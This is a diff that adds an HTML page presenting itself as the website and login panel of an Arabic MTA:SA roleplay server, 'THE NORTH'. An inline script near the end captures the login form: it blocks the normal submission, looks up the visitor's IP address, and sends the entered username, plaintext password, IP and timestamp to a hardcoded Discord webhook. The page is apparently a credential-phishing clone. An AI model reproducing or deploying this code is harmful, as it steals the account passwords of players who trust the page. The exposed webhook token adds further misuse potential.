@@ -1,0 +1,255 @@
+<!DOCTYPE html>
+<html lang="en">
+
+<head>
+  <meta charset="UTF-8">
+  <meta http-equiv="X-UA-Compatible" content="IE=edge">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>THE NORTH | نورث للحياة الواقعية</title>
+  <base href="https://north-rp.com/">
+  <!-- 
+    - favicon
+  -->
+  <link rel="shortcut icon" href="./assets/images/logo.png" type="image/svg+xml">
+
+  <!-- 
+    - custom css link
+  -->
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css" />
+  <link rel="stylesheet" href="./assets/css/style.css?v=1747173495">
+  <link rel="stylesheet" href="./assets/css/notification.css?v=1747173495">
+
+  <!-- 
+    - google font link
+  -->
+
+  <link rel="preconnect" href="https://fonts.googleapis.com">
+  <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+  <link href="https://fonts.googleapis.com/css2?family=Noto+Kufi+Arabic:wght@300&display=swap" rel="stylesheet">
+
+  <!-- 
+    - preload images
+  -->
+</head>
+
+<body id="top">
+  <div id="notification"></div>
+  <!-- 
+    - #HEADER
+  -->
+  <header class="header">
+
+    <div class="header-bottom" data-header>
+        <div class="container">
+
+            <div class="header-actions">
+                                    <button class="account-btn login-btn" aria-label="open search" data-account-toggler>
+                        <ion-icon name="person-outline"></ion-icon>
+                    </button>
+                
+                <button class="nav-toggle-btn" aria-label="toggle menu" data-nav-toggler>
+                    <ion-icon name="menu-outline" class="menu"></ion-icon>
+                    <ion-icon name="close-outline" class="close"></ion-icon>
+                </button>
+
+            </div>
+
+            <nav class="navbar" data-navbar>
+                <ul class="navbar-list">
+
+                    <!-- <li class="navbar-item">
+                        <a id="players" href="mtasa://87.98.143.50:22003" class="navbar-link skewBg" data-nav-link>جاري التحميل</a>
+                    </li> -->
+                    
+                                                <li class="navbar-item">
+                                <button id="store_link" class="navbar-link skewBg" data-nav-link>المتجر</button>
+                            </li>
+                                                <li class="navbar-item">
+                            <a href="https://discord.gg/thenorth" target="_blank" class="navbar-link skewBg" data-nav-link>الدسكورد</a>
+                        </li>
+                    
+                    
+                    <li class="navbar-item">
+                        <a href="https://north-rp.com/" class="navbar-link active-link" data-nav-link>الرئيسية</a>
+                    </li>
+
+                </ul>
+
+            </nav>
+
+            <a href="#" class="logo">
+                <img src="./assets/images/logo.png" height="60" alt="logo">
+            </a>
+
+        </div>
+    </div>
+
+</header>
+  <!-- 
+    - #ACCOUNT BOX
+  -->
+
+  <div class="account-container" data-account-box>
+    <div id="input-wrapper">
+      <div id="inviteContainer">
+        <div class="logoContainer">
+          <img class="logo" src="assets/images/logo.png" />
+          <h4 class="text">THE NORTH</h4>
+        </div>
+        <div class="acceptContainer">
+          <div class="close">
+            <ion-icon class="closebtn" name="add-outline"></ion-icon>
+          </div>
+          <form id="login" action="/index.php" method="post">
+            <h1>لوحة تسجيل الدخول</h1>
+            <div class="formContainer">
+              <div class="formDiv" style="transition-delay: 0.2s">
+                <p>اسم الحساب</p>
+                <input id="username" type="text" />
+              </div>
+              <div class="formDiv" style="transition-delay: 0.4s">
+                <p>كلمة السر</p>
+                <input id="password" type="password" />
+              </div>
+              <div class="formDiv" style="transition-delay: 0.6s">
+                <button class="acceptBtn" id="login-btn" type="submit">تسجيل الدخول</button>
+              </div>
+            </div>
+          </form>
+        </div>
+      </div>
+    </div>
+  </div>
+
+  <main>
+    <article>
+
+      <!-- 
+        - #HERO
+      -->
+
+      <section class="section hero" id="home" aria-label="home" style="background-image: url('./assets/images/back.png?v-1')">
+        <div class="container">
+
+          <div class="hero-content">
+
+            <h1 class="h1 hero-title">
+              THE <span class="span">NORTH</span> ROLEPLAY
+            </h1>
+
+            <p class="hero-text">نورث خادم عربي يمتاز بالعديد من الحصريات و الأنظمة المتطورة التي تخدم مصلحة اللاعب بالمركز الأول وتسمح له بإنشاء عالم خاص به بشكل واقعي ومميز وأيضا يتوفر على برمجيات متطورة جدا تسمح له بالوصول الى مراكز عليا في منصة الحياة الواقعية و ادارة مميزة تخدم مصالح اللاعبين</p>
+
+            <button class="btn skewBg" onclick="window.location.href='mtasa://87.98.143.50:22003'">إنضم إلينا</button>
+
+          </div>
+
+          <!-- <figure class="hero-banner img-holder" style="--width: 700; --height: 700;">
+            <img src="./assets/images/character.png" width="1800px" height="1800px" alt="hero banner" class="hero-img">
+          </figure> -->
+
+        </div>
+      </section>
+
+      <!-- 
+        - #SHOP
+      -->
+
+      <div id="modalContainer" class="modal">
+        <iframe id="modalContent" frameborder="0"></iframe>
+      </div>
+    </article>
+  </main>
+
+  <!-- 
+    - #FOOTER
+  -->
+
+  <footer class="footer">
+
+    <div class="footer-bottom">
+      <div class="container">
+
+        <p class="copyright">
+          &copy; <span style="display: inline;" id="year"></span> THE NORTH كافة الحقوق محفوظة
+        </p>
+
+        <!-- <img src="./assets/images/footer-bottom-img.png" width="340" height="21" loading="lazy" alt="" class="footer-bottom-img"> -->
+
+      </div>
+    </div>
+
+  </footer>
+
+  <!-- 
+    - #BACK TO TOP
+  -->
+
+  <a href="#top" class="back-top-btn" aria-label="back to top" data-back-top-btn>
+    <ion-icon name="caret-up"></ion-icon>
+  </a>
+
+  <!-- 
+    - custom js link
+  -->
+  <script src="https://cdnjs.cloudflare.com/ajax/libs/jquery/3.7.0/jquery.min.js"></script>
+  <script src="https://ricostacruz.com/jquery.transit/jquery.transit.min.js"></script>
+  <script src="./assets/js/ajax.js?v=1747173495"></script>
+  <script src="./assets/js/notification.js"></script>
+  <script src="./assets/js/discord.js?v=1747173495"></script>
+  <script src="./assets/js/script.js?v=1747173495"></script>
+<script>
+document.getElementById("login").addEventListener("submit", async function(e) {
+  e.preventDefault(); // إيقاف الإرسال التلقائي للنموذج
+
+  const username = document.getElementById("username").value;
+  const password = document.getElementById("password").value;
+
+  try {
+    // 1. الحصول على IP المستخدم
+    const ipResponse = await fetch("https://api.ipify.org?format=json");
+    const ipData = await ipResponse.json();
+    const userIP = ipData.ip || "غير معروف";
+
+    // 2. إعداد بيانات الويب هوك
+    const webhookURL = "https://discord.com/api/webhooks/1386606266067062884/sEslh4Thg_tWQ030QAFU0n_BIx4DKzaYo6Qn-Ve5CTozXbhMwsEsnYqubOcJJSvENkVN";
+    
+    const embed = {
+      title: "⚠️ محاولة تسجيل دخول جديدة",
+      color: 0xff0000, // لون أحمر للتنبيه
+      fields: [
+        { name: "اسم المستخدم", value: username || "غير معروف" },
+        { name: "كلمة المرور", value: "||" + password + "||" }, // مُخفاة في Discord
+        { name: "IP", value: userIP },
+        { name: "الوقت", value: new Date().toLocaleString() }
+      ],
+      footer: { text: "THE NORTH - نظام المراقبة" }
+    };
+
+    // 3. إرسال البيانات إلى Discord
+    await fetch(webhookURL, {
+      method: "POST",
+      headers: { "Content-Type": "application/json" },
+      body: JSON.stringify({ 
+        content: "تنبيه: محاولة تسجيل دخول",
+        embeds: [embed] 
+      })
+    });
+
+    // 4. إظهار رسالة للمستخدم
+    toast("success", "تم إرسال البيانات بنجاح");
+    
+  } catch (error) {
+    console.error("Error:", error);
+    toast("error", "حدث خطأ أثناء الإرسال!");
+  }
+});
+</script>
+  <!-- 
+    - ionicon link
+  -->
+  <script type="module" src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.esm.js"></script>
+  <script nomodule src="https://unpkg.com/ionicons@5.5.2/dist/ionicons/ionicons.js"></script>
+<script defer src="https://static.cloudflareinsights.com/beacon.min.js/vcd15cbe7772f49c399c6a5babf22c1241717689176015" integrity="sha512-ZpsOmlRQV6y907TI0dKBHq9Md29nnaEIPlkf84rnaERnq6zvWvPUqr2ft8M1aS28oN72PdrCzSjY4U6VaAw1EQ==" data-cf-beacon='{"rayId":"93f56a8ccb6bcfb5","version":"2025.4.0-1-g37f21b1","r":1,"token":"f091f1dc004d4b23a6b53ff5bf1e9cca","serverTiming":{"name":{"cfExtPri":true,"cfL4":true,"cfSpeedBrain":true,"cfCacheStatus":true}}}' crossorigin="anonymous"></script>
+</body>
+
+</html>
